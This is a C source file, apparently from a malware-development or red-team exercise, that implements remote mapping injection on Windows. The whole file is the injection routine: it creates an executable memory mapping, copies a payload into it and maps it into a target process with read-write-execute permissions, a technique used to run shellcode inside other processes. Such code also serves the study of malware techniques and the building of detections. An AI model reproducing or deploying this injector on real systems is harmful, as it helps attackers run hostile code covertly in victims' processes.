#include "MappingInjection.h"

BOOL RemoteMapInjector(HANDLE hProcess, PBYTE pPayload, SIZE_T sPayloadSize, PVOID* ppAddress) {

	PVOID	pMapLocalAddress		= NULL;
	HANDLE	hFile					= NULL;
	SIZE_T	NumberOfWrittenBytes	= 0;


	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (!hFile) {
		printf("[!] CreateFileMappingA Failed with Error: %ld\n", GetLastError());
		goto _RETURN;
	}

	printf("[+] File Mapping Created, press enter to map view...\n");
	getchar();

	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_EXECUTE | FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
	if (!pMapLocalAddress) {
		printf("[!] MapViewOfFile Faield with Error: %ld\n", GetLastError());
		goto _RETURN;
	}

	printf("[+] Map was viewed, press enter to write memory... | pAddress: %p\n", pMapLocalAddress);
	getchar();

	/*if (!WriteProcessMemory(GetCurrentProcess(), *ppAddress, pPayload, sPayloadSize, &NumberOfWrittenBytes)) {
		printf("[!] WriteProcessMemory Failed with Error: %ld\n", GetLastError());
		goto _RETURN;
	}*/

	memcpy(pMapLocalAddress, pPayload, sPayloadSize);

	printf("[+] Wrote the memory, press enter to map to remote process ...\n");
	getchar();

	*ppAddress = MapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
	if (!*ppAddress) {
		printf("[!] MapViewOfFile2 Faield with Error: %ld\n", GetLastError());
		goto _RETURN;
	}

_RETURN:
	if (hFile)
		CloseHandle(hFile);
	if (!*ppAddress)
		return FALSE;
	return TRUE;
}